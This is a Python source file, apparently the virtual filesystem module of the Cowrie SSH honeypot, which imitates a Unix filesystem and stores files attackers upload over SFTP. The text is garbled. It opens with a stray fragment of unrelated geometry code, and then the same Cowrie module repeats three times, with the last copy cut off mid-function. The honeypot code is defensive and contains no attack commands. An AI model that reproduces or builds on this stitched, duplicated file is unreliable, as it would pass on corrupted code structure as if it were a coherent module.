            buffered_by_type[geometry_type] = bounds_buffer(bounds, offset)
        return buffered_by_type

    return bounds_pad

# Copyright (c) 2009-2014 Upi Tamminen <desaster@gmail.com>
# See the COPYRIGHT file for more information

"""
This module contains ...
"""

from __future__ import division, absolute_import

try:
    import cPickle as pickle
except:
    import pickle

import os
import time
import fnmatch
import hashlib
import re
import stat
import errno

from twisted.python import log

from cowrie.core.config import CONFIG

PICKLE = pickle.load(open(CONFIG.get('honeypot', 'filesystem_file'), 'rb'))

A_NAME, \
    A_TYPE, \
    A_UID, \
    A_GID, \
    A_SIZE, \
    A_MODE, \
    A_CTIME, \
    A_CONTENTS, \
    A_TARGET, \
    A_REALFILE = list(range(0, 10))
T_LINK, \
    T_DIR, \
    T_FILE, \
    T_BLK, \
    T_CHR, \
    T_SOCK, \
    T_FIFO = list(range(0, 7))

class TooManyLevels(Exception):
    """
    62 ELOOP Too many levels of symbolic links.  A path name lookup involved more than 8 symbolic links.
    raise OSError(errno.ELOOP, os.strerror(errno.ENOENT))
    """
    pass



class FileNotFound(Exception):
    """
    raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
    """
    pass



class HoneyPotFilesystem(object):
    """
    """

    def __init__(self, fs, cfg):
        self.fs = fs
        self.cfg = cfg

        # Keep track of open file descriptors
        self.tempfiles = {}
        self.filenames = {}

        # Keep count of new files, so we can have an artificial limit
        self.newcount = 0

        # Get the honeyfs path from the config file and explore it for file
        # contents:
        self.init_honeyfs(self.cfg.get('honeypot', 'contents_path'))


    def init_honeyfs(self, honeyfs_path):
        """
        Explore the honeyfs at 'honeyfs_path' and set all A_REALFILE attributes on
        the virtual filesystem.
        """

        for path, directories, filenames in os.walk(honeyfs_path):
            for filename in filenames:
                realfile_path = os.path.join(path, filename)
                virtual_path = '/' + os.path.relpath(realfile_path, honeyfs_path)

                f = self.getfile(virtual_path, follow_symlinks=False)
                if f and f[A_TYPE] == T_FILE:
                    self.update_realfile(f, realfile_path)

    def resolve_path(self, path, cwd):
        """
        This function does not need to be in this class, it has no dependencies
        """
        pieces = path.rstrip('/').split('/')

        if path[0] == '/':
            cwd = []
        else:
            cwd = [x for x in cwd.split('/') if len(x) and x is not None]

        while 1:
            if not len(pieces):
                break
            piece = pieces.pop(0)
            if piece == '..':
                if len(cwd): cwd.pop()
                continue
            if piece in ('.', ''):
                continue
            cwd.append(piece)

        return '/%s' % ('/'.join(cwd),)


    def resolve_path_wc(self, path, cwd):
        """
        Resolve_path with wildcard support (globbing)
        """
        pieces = path.rstrip('/').split('/')
        if len(pieces[0]):
            cwd = [x for x in cwd.split('/') if len(x) and x is not None]
            path = path[1:]
        else:
            cwd, pieces = [], pieces[1:]
        found = []
        def foo(p, cwd):
            if not len(p):
                found.append('/%s' % ('/'.join(cwd),))
            elif p[0] == '.':
                foo(p[1:], cwd)
            elif p[0] == '..':
                foo(p[1:], cwd[:-1])
            else:
                names = [x[A_NAME] for x in self.get_path('/'.join(cwd))]
                matches = [x for x in names if fnmatch.fnmatchcase(x, p[0])]
                for match in matches:
                    foo(p[1:], cwd + [match])
        foo(pieces, cwd)
        return found


    def get_path(self, path, follow_symlinks=True):
        """
        This returns the Cowrie file system objects for a directory
        """
        cwd = self.fs
        for part in path.split('/'):
            if not len(part):
                continue
            ok = False
            for c in cwd[A_CONTENTS]:
                if c[A_NAME] == part:
                    if c[A_TYPE] == T_LINK:
                        cwd = self.getfile(c[A_TARGET],
                            follow_symlinks=follow_symlinks)
                    else:
                        cwd = c
                    ok = True
                    break
            if not ok:
                raise FileNotFound
        return cwd[A_CONTENTS]


    def exists(self, path):
        """
        Return True if path refers to an existing path.
        Returns False for broken symbolic links.
        """
        f = self.getfile(path, follow_symlinks=True)
        if f is not False:
            return True


    def lexists(self, path):
        """
        Return True if path refers to an existing path.
        Returns True for broken symbolic links.
        """
        f = self.getfile(path, follow_symlinks=False)
        if f is not False:
            return True


    def update_realfile(self, f, realfile):
        """
        """
        if not f[A_REALFILE] and os.path.exists(realfile) and \
                not os.path.islink(realfile) and os.path.isfile(realfile) and \
                f[A_SIZE] < 25000000:
            f[A_REALFILE] = realfile


    def getfile(self, path, follow_symlinks=True):
        """
        This returns the Cowrie file system object for a path
        """
        if path == '/':
            return self.fs
        pieces = path.strip('/').split('/')
        cwd = ''
        p = self.fs
        for piece in pieces:
            if piece not in [x[A_NAME] for x in p[A_CONTENTS]]:
                return False
            for x in p[A_CONTENTS]:
                if x[A_NAME] == piece:
                    if piece == pieces[-1] and follow_symlinks==False:
                        p = x
                    elif x[A_TYPE] == T_LINK:
                        if x[A_TARGET][0] == '/':
                            # Absolute link
                            p = self.getfile(x[A_TARGET],
                                follow_symlinks=follow_symlinks)
                        else:
                            # Relative link
                            p = self.getfile('/'.join((cwd, x[A_TARGET])),
                                follow_symlinks=follow_symlinks)
                        if p == False:
                            # Broken link
                            return False
                    else:
                        p = x
            cwd = '/'.join((cwd, piece))                    
        return p


    def file_contents(self, target):
        """
        Retrieve the content of a file in the honeyfs
        It follows links.
        It tries A_REALFILE first and then tries honeyfs directory
        """
        path = self.resolve_path(target, os.path.dirname(target))
        if not path or not self.exists(path):
            raise FileNotFound
        f = self.getfile(path)
        if f[A_TYPE] == T_DIR:
            raise IsADirectoryError
        elif f[A_TYPE] == T_FILE and f[A_REALFILE]:
            return open(f[A_REALFILE], 'rb').read()
        elif f[A_TYPE] == T_FILE and f[A_SIZE] == 0:
            # Zero-byte file lacking A_REALFILE backing: probably empty.
            # (The exceptions to this are some system files in /proc and /sys,
            # but it's likely better to return nothing than suspiciously fail.)
            return ''


    def mkfile(self, path, uid, gid, size, mode, ctime=None):
        """
        """
        if self.newcount > 10000:
            return False
        if ctime is None:
            ctime = time.time()
        dir = self.get_path(os.path.dirname(path))
        outfile = os.path.basename(path)
        if outfile in [x[A_NAME] for x in dir]:
            dir.remove([x for x in dir if x[A_NAME] == outfile][0])
        dir.append([outfile, T_FILE, uid, gid, size, mode, ctime, [],
            None, None])
        self.newcount += 1
        return True


    def mkdir(self, path, uid, gid, size, mode, ctime=None):
        """
        """
        if self.newcount > 10000:
            raise OSError(errno.EDQUOT, os.strerror(errno.EDQUOT), path)
        if ctime is None:
            ctime = time.time()
        if not len(path.strip('/')):
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT), path)
        try:
            dir = self.get_path(os.path.dirname(path.strip('/')))
        except IndexError:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT), path)
            return False
        dir.append([os.path.basename(path), T_DIR, uid, gid, size, mode,
            ctime, [], None, None])
        self.newcount += 1


    def isfile(self, path):
        """
        Return True if path is an existing regular file. This follows symbolic
        links, so both islink() and isfile() can be true for the same path.
        """
        try:
            f = self.getfile(path)
        except:
            return False
        return f[A_TYPE] == T_FILE


    def islink(self, path):
        """
        Return True if path refers to a directory entry that is a symbolic
        link. Always False if symbolic links are not supported by the python
        runtime.
        """
        try:
            f = self.getfile(path)
        except:
            return False
        return f[A_TYPE] == T_LINK


    def isdir(self, path):
        """
        Return True if path is an existing directory.
        This follows symbolic links, so both islink() and isdir() can be true for the same path.
        """
        if path == '/':
            return True
        try:
            dir = self.getfile(path)
        except:
            dir = None
        if dir is None or dir is False:
            return False
        if dir[A_TYPE] == T_DIR:
            return True
        else:
            return False

    """
    Below additions for SFTP support, try to keep functions here similar to os.*
    """
    def open(self, filename, openFlags, mode):
        """
        #log.msg("fs.open %s" % filename)

        #if (openFlags & os.O_APPEND == os.O_APPEND):
        #    log.msg("fs.open append")

        #if (openFlags & os.O_CREAT == os.O_CREAT):
        #    log.msg("fs.open creat")

        #if (openFlags & os.O_TRUNC == os.O_TRUNC):
        #    log.msg("fs.open trunc")

        #if (openFlags & os.O_EXCL == os.O_EXCL):
        #    log.msg("fs.open excl")

        # treat O_RDWR same as O_WRONLY
        """
        if openFlags & os.O_WRONLY == os.O_WRONLY or openFlags & os.O_RDWR == os.O_RDWR:
            # strip executable bit
            hostmode = mode & ~(111)
            hostfile = '%s/%s_sftp_%s' % \
                       (self.cfg.get('honeypot', 'download_path'),
                    time.strftime('%Y%m%d-%H%M%S'),
                    re.sub('[^A-Za-z0-9]', '_', filename))
            #log.msg("fs.open file for writing, saving to %s" % safeoutfile)
            self.mkfile(filename, 0, 0, 0, stat.S_IFREG | mode)
            fd = os.open(hostfile, openFlags, hostmode)
            self.update_realfile(self.getfile(filename), hostfile)
            self.tempfiles[fd] = hostfile
            self.filenames[fd] = filename
            return fd

        elif openFlags & os.O_RDONLY == os.O_RDONLY:
            return None

        return None


    def read(self, fd, size):
        """
        """
        # this should not be called, we intercept at readChunk
        raise notImplementedError


    def write(self, fd, string):
        """
        """
        return os.write(fd, string)


    def close(self, fd):
        """
        """
        if not fd:
            return True
        if self.tempfiles[fd] is not None:
            shasum = hashlib.sha256(open(self.tempfiles[fd], 'rb').read()).hexdigest()
            shasumfile = self.cfg.get('honeypot', 'download_path') + "/" + shasum
            if (os.path.exists(shasumfile)):
                os.remove(self.tempfiles[fd])
            else:
                os.rename(self.tempfiles[fd], shasumfile)
            #os.symlink(shasum, self.tempfiles[fd])
            self.update_realfile(self.getfile(self.filenames[fd]), shasumfile)
            log.msg(format='SFTP Uploaded file \"%(filename)s\" to %(outfile)s',
                    eventid='cowrie.session.file_upload',
                    filename=os.path.basename(self.filenames[fd]),
                    outfile=shasumfile,
                    shasum=shasum)
            del self.tempfiles[fd]
            del self.filenames[fd]
        return os.close(fd)


    def lseek(self, fd, offset, whence):
        """
        """
        if not fd:
            return True
        return os.lseek(fd, offset, whence)


    def mkdir2(self, path):
        """
        FIXME mkdir() name conflicts with existing mkdir
        """
        dir = self.getfile(path)
        if dir != False:
            raise OSError(errno.EEXIST, os.strerror(errno.EEXIST), path)
        self.mkdir(path, 0, 0, 4096, 16877)


    def rmdir(self, path):
        """
        """
        path = path.rstrip('/')
        name = os.path.basename(path)
        parent = os.path.dirname(path)
        dir = self.getfile(path, follow_symlinks=False)
        if dir == False:
            raise OSError(errno.EEXIST, os.strerror(errno.EEXIST), path)
        if dir[A_TYPE] != T_DIR:
            raise OSError(errno.ENOTDIR, os.strerror(errno.ENOTDIR), path)
        if len(self.get_path(path))>0:
            raise OSError(errno.ENOTEMPTY, os.strerror(errno.ENOTEMPTY), path)
        pdir = self.get_path(parent,follow_symlinks=True)
        for i in pdir[:]:
            if i[A_NAME] == name:
                pdir.remove(i)
                return True
        return False


    def utime(self, path, atime, mtime):
        """
        """
        p = self.getfile(path)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        p[A_CTIME] = mtime


    def chmod(self, path, perm):
        """
        """
        p = self.getfile(path)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        p[A_MODE] = stat.S_IFMT(p[A_MODE]) | perm


    def chown(self, path, uid, gid):
        """
        """
        p = self.getfile(path)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        if (uid != -1):
            p[A_UID] = uid
        if (gid != -1):
            p[A_GID] = gid


    def remove(self, path):
        """
        """
        p = self.getfile(path, follow_symlinks=False)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        self.get_path(os.path.dirname(path)).remove(p)
        return


    def readlink(self, path):
        """
        """
        p = self.getfile(path, follow_symlinks=False)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        if not (p[A_MODE] & stat.S_IFLNK):
            raise OSError
        return p[A_TARGET]


    def symlink(self, targetPath, linkPath):
        """
        """
        raise notImplementedError


    def rename(self, oldpath, newpath):
        """
        """
        old = self.getfile(oldpath)
        if old == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        new = self.getfile(newpath)
        if new != False:
            raise OSError(errno.EEXIST, os.strerror(errno.EEXIST))

        self.get_path(os.path.dirname(oldpath)).remove(old)
        old[A_NAME] = os.path.basename(newpath)
        self.get_path(os.path.dirname(newpath)).append(old)
        return


    def listdir(self, path):
        """
        """
        names = [x[A_NAME] for x in self.get_path(path)]
        return names


    def lstat(self, path):
        """
        """
        return self.stat(path, follow_symlinks=False)


    def stat(self, path, follow_symlinks=True):
        """
        """
        if (path == "/"):
            p = {A_TYPE:T_DIR, A_UID:0, A_GID:0, A_SIZE:4096, A_MODE:16877,
                A_CTIME:time.time()}
        else:
            p = self.getfile(path, follow_symlinks=follow_symlinks)

        if (p == False):
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))

        return _statobj( p[A_MODE], 0, 0, 1, p[A_UID], p[A_GID], p[A_SIZE],
            p[A_CTIME], p[A_CTIME], p[A_CTIME])


    def realpath(self, path):
        """
        """
        return path


    def update_size(self, filename, size):
        """
        """
        f = self.getfile(filename)
        if f == False:
            return
        if f[A_TYPE] != T_FILE:
            return
        f[A_SIZE] = size



class _statobj(object):
    """
    Transform a tuple into a stat object
    """
    def __init__(self, st_mode, st_ino, st_dev, st_nlink, st_uid, st_gid, st_size, st_atime, st_mtime, st_ctime):
        self.st_mode = st_mode
        self.st_ino = st_ino
        self.st_dev = st_dev
        self.st_nlink = st_nlink
        self.st_uid = st_uid
        self.st_gid = st_gid
        self.st_size = st_size
        self.st_atime = st_atime
        self.st_mtime = st_mtime
        self.st_ctime = st_ctime


# Copyright (c) 2009-2014 Upi Tamminen <desaster@gmail.com>
# See the COPYRIGHT file for more information

"""
This module contains ...
"""

from __future__ import division, absolute_import

try:
    import cPickle as pickle
except:
    import pickle

import os
import time
import fnmatch
import hashlib
import re
import stat
import errno

from twisted.python import log

from cowrie.core.config import CONFIG

PICKLE = pickle.load(open(CONFIG.get('honeypot', 'filesystem_file'), 'rb'))

A_NAME, \
    A_TYPE, \
    A_UID, \
    A_GID, \
    A_SIZE, \
    A_MODE, \
    A_CTIME, \
    A_CONTENTS, \
    A_TARGET, \
    A_REALFILE = list(range(0, 10))
T_LINK, \
    T_DIR, \
    T_FILE, \
    T_BLK, \
    T_CHR, \
    T_SOCK, \
    T_FIFO = list(range(0, 7))

class TooManyLevels(Exception):
    """
    62 ELOOP Too many levels of symbolic links.  A path name lookup involved more than 8 symbolic links.
    raise OSError(errno.ELOOP, os.strerror(errno.ENOENT))
    """
    pass



class FileNotFound(Exception):
    """
    raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
    """
    pass



class HoneyPotFilesystem(object):
    """
    """

    def __init__(self, fs, cfg):
        self.fs = fs
        self.cfg = cfg

        # Keep track of open file descriptors
        self.tempfiles = {}
        self.filenames = {}

        # Keep count of new files, so we can have an artificial limit
        self.newcount = 0

        # Get the honeyfs path from the config file and explore it for file
        # contents:
        self.init_honeyfs(self.cfg.get('honeypot', 'contents_path'))


    def init_honeyfs(self, honeyfs_path):
        """
        Explore the honeyfs at 'honeyfs_path' and set all A_REALFILE attributes on
        the virtual filesystem.
        """

        for path, directories, filenames in os.walk(honeyfs_path):
            for filename in filenames:
                realfile_path = os.path.join(path, filename)
                virtual_path = '/' + os.path.relpath(realfile_path, honeyfs_path)

                f = self.getfile(virtual_path, follow_symlinks=False)
                if f and f[A_TYPE] == T_FILE:
                    self.update_realfile(f, realfile_path)

    def resolve_path(self, path, cwd):
        """
        This function does not need to be in this class, it has no dependencies
        """
        pieces = path.rstrip('/').split('/')

        if path[0] == '/':
            cwd = []
        else:
            cwd = [x for x in cwd.split('/') if len(x) and x is not None]

        while 1:
            if not len(pieces):
                break
            piece = pieces.pop(0)
            if piece == '..':
                if len(cwd): cwd.pop()
                continue
            if piece in ('.', ''):
                continue
            cwd.append(piece)

        return '/%s' % ('/'.join(cwd),)


    def resolve_path_wc(self, path, cwd):
        """
        Resolve_path with wildcard support (globbing)
        """
        pieces = path.rstrip('/').split('/')
        if len(pieces[0]):
            cwd = [x for x in cwd.split('/') if len(x) and x is not None]
            path = path[1:]
        else:
            cwd, pieces = [], pieces[1:]
        found = []
        def foo(p, cwd):
            if not len(p):
                found.append('/%s' % ('/'.join(cwd),))
            elif p[0] == '.':
                foo(p[1:], cwd)
            elif p[0] == '..':
                foo(p[1:], cwd[:-1])
            else:
                names = [x[A_NAME] for x in self.get_path('/'.join(cwd))]
                matches = [x for x in names if fnmatch.fnmatchcase(x, p[0])]
                for match in matches:
                    foo(p[1:], cwd + [match])
        foo(pieces, cwd)
        return found


    def get_path(self, path, follow_symlinks=True):
        """
        This returns the Cowrie file system objects for a directory
        """
        cwd = self.fs
        for part in path.split('/'):
            if not len(part):
                continue
            ok = False
            for c in cwd[A_CONTENTS]:
                if c[A_NAME] == part:
                    if c[A_TYPE] == T_LINK:
                        cwd = self.getfile(c[A_TARGET],
                            follow_symlinks=follow_symlinks)
                    else:
                        cwd = c
                    ok = True
                    break
            if not ok:
                raise FileNotFound
        return cwd[A_CONTENTS]


    def exists(self, path):
        """
        Return True if path refers to an existing path.
        Returns False for broken symbolic links.
        """
        f = self.getfile(path, follow_symlinks=True)
        if f is not False:
            return True


    def lexists(self, path):
        """
        Return True if path refers to an existing path.
        Returns True for broken symbolic links.
        """
        f = self.getfile(path, follow_symlinks=False)
        if f is not False:
            return True


    def update_realfile(self, f, realfile):
        """
        """
        if not f[A_REALFILE] and os.path.exists(realfile) and \
                not os.path.islink(realfile) and os.path.isfile(realfile) and \
                f[A_SIZE] < 25000000:
            f[A_REALFILE] = realfile


    def getfile(self, path, follow_symlinks=True):
        """
        This returns the Cowrie file system object for a path
        """
        if path == '/':
            return self.fs
        pieces = path.strip('/').split('/')
        cwd = ''
        p = self.fs
        for piece in pieces:
            if piece not in [x[A_NAME] for x in p[A_CONTENTS]]:
                return False
            for x in p[A_CONTENTS]:
                if x[A_NAME] == piece:
                    if piece == pieces[-1] and follow_symlinks==False:
                        p = x
                    elif x[A_TYPE] == T_LINK:
                        if x[A_TARGET][0] == '/':
                            # Absolute link
                            p = self.getfile(x[A_TARGET],
                                follow_symlinks=follow_symlinks)
                        else:
                            # Relative link
                            p = self.getfile('/'.join((cwd, x[A_TARGET])),
                                follow_symlinks=follow_symlinks)
                        if p == False:
                            # Broken link
                            return False
                    else:
                        p = x
            cwd = '/'.join((cwd, piece))                    
        return p


    def file_contents(self, target):
        """
        Retrieve the content of a file in the honeyfs
        It follows links.
        It tries A_REALFILE first and then tries honeyfs directory
        """
        path = self.resolve_path(target, os.path.dirname(target))
        if not path or not self.exists(path):
            raise FileNotFound
        f = self.getfile(path)
        if f[A_TYPE] == T_DIR:
            raise IsADirectoryError
        elif f[A_TYPE] == T_FILE and f[A_REALFILE]:
            return open(f[A_REALFILE], 'rb').read()
        elif f[A_TYPE] == T_FILE and f[A_SIZE] == 0:
            # Zero-byte file lacking A_REALFILE backing: probably empty.
            # (The exceptions to this are some system files in /proc and /sys,
            # but it's likely better to return nothing than suspiciously fail.)
            return ''


    def mkfile(self, path, uid, gid, size, mode, ctime=None):
        """
        """
        if self.newcount > 10000:
            return False
        if ctime is None:
            ctime = time.time()
        dir = self.get_path(os.path.dirname(path))
        outfile = os.path.basename(path)
        if outfile in [x[A_NAME] for x in dir]:
            dir.remove([x for x in dir if x[A_NAME] == outfile][0])
        dir.append([outfile, T_FILE, uid, gid, size, mode, ctime, [],
            None, None])
        self.newcount += 1
        return True


    def mkdir(self, path, uid, gid, size, mode, ctime=None):
        """
        """
        if self.newcount > 10000:
            raise OSError(errno.EDQUOT, os.strerror(errno.EDQUOT), path)
        if ctime is None:
            ctime = time.time()
        if not len(path.strip('/')):
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT), path)
        try:
            dir = self.get_path(os.path.dirname(path.strip('/')))
        except IndexError:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT), path)
            return False
        dir.append([os.path.basename(path), T_DIR, uid, gid, size, mode,
            ctime, [], None, None])
        self.newcount += 1


    def isfile(self, path):
        """
        Return True if path is an existing regular file. This follows symbolic
        links, so both islink() and isfile() can be true for the same path.
        """
        try:
            f = self.getfile(path)
        except:
            return False
        return f[A_TYPE] == T_FILE


    def islink(self, path):
        """
        Return True if path refers to a directory entry that is a symbolic
        link. Always False if symbolic links are not supported by the python
        runtime.
        """
        try:
            f = self.getfile(path)
        except:
            return False
        return f[A_TYPE] == T_LINK


    def isdir(self, path):
        """
        Return True if path is an existing directory.
        This follows symbolic links, so both islink() and isdir() can be true for the same path.
        """
        if path == '/':
            return True
        try:
            dir = self.getfile(path)
        except:
            dir = None
        if dir is None or dir is False:
            return False
        if dir[A_TYPE] == T_DIR:
            return True
        else:
            return False

    """
    Below additions for SFTP support, try to keep functions here similar to os.*
    """
    def open(self, filename, openFlags, mode):
        """
        #log.msg("fs.open %s" % filename)

        #if (openFlags & os.O_APPEND == os.O_APPEND):
        #    log.msg("fs.open append")

        #if (openFlags & os.O_CREAT == os.O_CREAT):
        #    log.msg("fs.open creat")

        #if (openFlags & os.O_TRUNC == os.O_TRUNC):
        #    log.msg("fs.open trunc")

        #if (openFlags & os.O_EXCL == os.O_EXCL):
        #    log.msg("fs.open excl")

        # treat O_RDWR same as O_WRONLY
        """
        if openFlags & os.O_WRONLY == os.O_WRONLY or openFlags & os.O_RDWR == os.O_RDWR:
            # strip executable bit
            hostmode = mode & ~(111)
            hostfile = '%s/%s_sftp_%s' % \
                       (self.cfg.get('honeypot', 'download_path'),
                    time.strftime('%Y%m%d-%H%M%S'),
                    re.sub('[^A-Za-z0-9]', '_', filename))
            #log.msg("fs.open file for writing, saving to %s" % safeoutfile)
            self.mkfile(filename, 0, 0, 0, stat.S_IFREG | mode)
            fd = os.open(hostfile, openFlags, hostmode)
            self.update_realfile(self.getfile(filename), hostfile)
            self.tempfiles[fd] = hostfile
            self.filenames[fd] = filename
            return fd

        elif openFlags & os.O_RDONLY == os.O_RDONLY:
            return None

        return None


    def read(self, fd, size):
        """
        """
        # this should not be called, we intercept at readChunk
        raise notImplementedError


    def write(self, fd, string):
        """
        """
        return os.write(fd, string)


    def close(self, fd):
        """
        """
        if not fd:
            return True
        if self.tempfiles[fd] is not None:
            shasum = hashlib.sha256(open(self.tempfiles[fd], 'rb').read()).hexdigest()
            shasumfile = self.cfg.get('honeypot', 'download_path') + "/" + shasum
            if (os.path.exists(shasumfile)):
                os.remove(self.tempfiles[fd])
            else:
                os.rename(self.tempfiles[fd], shasumfile)
            #os.symlink(shasum, self.tempfiles[fd])
            self.update_realfile(self.getfile(self.filenames[fd]), shasumfile)
            log.msg(format='SFTP Uploaded file \"%(filename)s\" to %(outfile)s',
                    eventid='cowrie.session.file_upload',
                    filename=os.path.basename(self.filenames[fd]),
                    outfile=shasumfile,
                    shasum=shasum)
            del self.tempfiles[fd]
            del self.filenames[fd]
        return os.close(fd)


    def lseek(self, fd, offset, whence):
        """
        """
        if not fd:
            return True
        return os.lseek(fd, offset, whence)


    def mkdir2(self, path):
        """
        FIXME mkdir() name conflicts with existing mkdir
        """
        dir = self.getfile(path)
        if dir != False:
            raise OSError(errno.EEXIST, os.strerror(errno.EEXIST), path)
        self.mkdir(path, 0, 0, 4096, 16877)


    def rmdir(self, path):
        """
        """
        path = path.rstrip('/')
        name = os.path.basename(path)
        parent = os.path.dirname(path)
        dir = self.getfile(path, follow_symlinks=False)
        if dir == False:
            raise OSError(errno.EEXIST, os.strerror(errno.EEXIST), path)
        if dir[A_TYPE] != T_DIR:
            raise OSError(errno.ENOTDIR, os.strerror(errno.ENOTDIR), path)
        if len(self.get_path(path))>0:
            raise OSError(errno.ENOTEMPTY, os.strerror(errno.ENOTEMPTY), path)
        pdir = self.get_path(parent,follow_symlinks=True)
        for i in pdir[:]:
            if i[A_NAME] == name:
                pdir.remove(i)
                return True
        return False


    def utime(self, path, atime, mtime):
        """
        """
        p = self.getfile(path)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        p[A_CTIME] = mtime


    def chmod(self, path, perm):
        """
        """
        p = self.getfile(path)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        p[A_MODE] = stat.S_IFMT(p[A_MODE]) | perm


    def chown(self, path, uid, gid):
        """
        """
        p = self.getfile(path)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        if (uid != -1):
            p[A_UID] = uid
        if (gid != -1):
            p[A_GID] = gid


    def remove(self, path):
        """
        """
        p = self.getfile(path, follow_symlinks=False)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        self.get_path(os.path.dirname(path)).remove(p)
        return


    def readlink(self, path):
        """
        """
        p = self.getfile(path, follow_symlinks=False)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        if not (p[A_MODE] & stat.S_IFLNK):
            raise OSError
        return p[A_TARGET]


    def symlink(self, targetPath, linkPath):
        """
        """
        raise notImplementedError


    def rename(self, oldpath, newpath):
        """
        """
        old = self.getfile(oldpath)
        if old == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        new = self.getfile(newpath)
        if new != False:
            raise OSError(errno.EEXIST, os.strerror(errno.EEXIST))

        self.get_path(os.path.dirname(oldpath)).remove(old)
        old[A_NAME] = os.path.basename(newpath)
        self.get_path(os.path.dirname(newpath)).append(old)
        return


    def listdir(self, path):
        """
        """
        names = [x[A_NAME] for x in self.get_path(path)]
        return names


    def lstat(self, path):
        """
        """
        return self.stat(path, follow_symlinks=False)


    def stat(self, path, follow_symlinks=True):
        """
        """
        if (path == "/"):
            p = {A_TYPE:T_DIR, A_UID:0, A_GID:0, A_SIZE:4096, A_MODE:16877,
                A_CTIME:time.time()}
        else:
            p = self.getfile(path, follow_symlinks=follow_symlinks)

        if (p == False):
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))

        return _statobj( p[A_MODE], 0, 0, 1, p[A_UID], p[A_GID], p[A_SIZE],
            p[A_CTIME], p[A_CTIME], p[A_CTIME])


    def realpath(self, path):
        """
        """
        return path


    def update_size(self, filename, size):
        """
        """
        f = self.getfile(filename)
        if f == False:
            return
        if f[A_TYPE] != T_FILE:
            return
        f[A_SIZE] = size



class _statobj(object):
    """
    Transform a tuple into a stat object
    """
    def __init__(self, st_mode, st_ino, st_dev, st_nlink, st_uid, st_gid, st_size, st_atime, st_mtime, st_ctime):
        self.st_mode = st_mode
        self.st_ino = st_ino
        self.st_dev = st_dev
        self.st_nlink = st_nlink
        self.st_uid = st_uid
        self.st_gid = st_gid
        self.st_size = st_size
        self.st_atime = st_atime
        self.st_mtime = st_mtime
        self.st_ctime = st_ctime


# Copyright (c) 2009-2014 Upi Tamminen <desaster@gmail.com>
# See the COPYRIGHT file for more information

"""
This module contains ...
"""

from __future__ import division, absolute_import

try:
    import cPickle as pickle
except:
    import pickle

import os
import time
import fnmatch
import hashlib
import re
import stat
import errno

from twisted.python import log

from cowrie.core.config import CONFIG

PICKLE = pickle.load(open(CONFIG.get('honeypot', 'filesystem_file'), 'rb'))

A_NAME, \
    A_TYPE, \
    A_UID, \
    A_GID, \
    A_SIZE, \
    A_MODE, \
    A_CTIME, \
    A_CONTENTS, \
    A_TARGET, \
    A_REALFILE = list(range(0, 10))
T_LINK, \
    T_DIR, \
    T_FILE, \
    T_BLK, \
    T_CHR, \
    T_SOCK, \
    T_FIFO = list(range(0, 7))

class TooManyLevels(Exception):
    """
    62 ELOOP Too many levels of symbolic links.  A path name lookup involved more than 8 symbolic links.
    raise OSError(errno.ELOOP, os.strerror(errno.ENOENT))
    """
    pass



class FileNotFound(Exception):
    """
    raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
    """
    pass



class HoneyPotFilesystem(object):
    """
    """

    def __init__(self, fs, cfg):
        self.fs = fs
        self.cfg = cfg

        # Keep track of open file descriptors
        self.tempfiles = {}
        self.filenames = {}

        # Keep count of new files, so we can have an artificial limit
        self.newcount = 0

        # Get the honeyfs path from the config file and explore it for file
        # contents:
        self.init_honeyfs(self.cfg.get('honeypot', 'contents_path'))


    def init_honeyfs(self, honeyfs_path):
        """
        Explore the honeyfs at 'honeyfs_path' and set all A_REALFILE attributes on
        the virtual filesystem.
        """

        for path, directories, filenames in os.walk(honeyfs_path):
            for filename in filenames:
                realfile_path = os.path.join(path, filename)
                virtual_path = '/' + os.path.relpath(realfile_path, honeyfs_path)

                f = self.getfile(virtual_path, follow_symlinks=False)
                if f and f[A_TYPE] == T_FILE:
                    self.update_realfile(f, realfile_path)

    def resolve_path(self, path, cwd):
        """
        This function does not need to be in this class, it has no dependencies
        """
        pieces = path.rstrip('/').split('/')

        if path[0] == '/':
            cwd = []
        else:
            cwd = [x for x in cwd.split('/') if len(x) and x is not None]

        while 1:
            if not len(pieces):
                break
            piece = pieces.pop(0)
            if piece == '..':
                if len(cwd): cwd.pop()
                continue
            if piece in ('.', ''):
                continue
            cwd.append(piece)

        return '/%s' % ('/'.join(cwd),)


    def resolve_path_wc(self, path, cwd):
        """
        Resolve_path with wildcard support (globbing)
        """
        pieces = path.rstrip('/').split('/')
        if len(pieces[0]):
            cwd = [x for x in cwd.split('/') if len(x) and x is not None]
            path = path[1:]
        else:
            cwd, pieces = [], pieces[1:]
        found = []
        def foo(p, cwd):
            if not len(p):
                found.append('/%s' % ('/'.join(cwd),))
            elif p[0] == '.':
                foo(p[1:], cwd)
            elif p[0] == '..':
                foo(p[1:], cwd[:-1])
            else:
                names = [x[A_NAME] for x in self.get_path('/'.join(cwd))]
                matches = [x for x in names if fnmatch.fnmatchcase(x, p[0])]
                for match in matches:
                    foo(p[1:], cwd + [match])
        foo(pieces, cwd)
        return found


    def get_path(self, path, follow_symlinks=True):
        """
        This returns the Cowrie file system objects for a directory
        """
        cwd = self.fs
        for part in path.split('/'):
            if not len(part):
                continue
            ok = False
            for c in cwd[A_CONTENTS]:
                if c[A_NAME] == part:
                    if c[A_TYPE] == T_LINK:
                        cwd = self.getfile(c[A_TARGET],
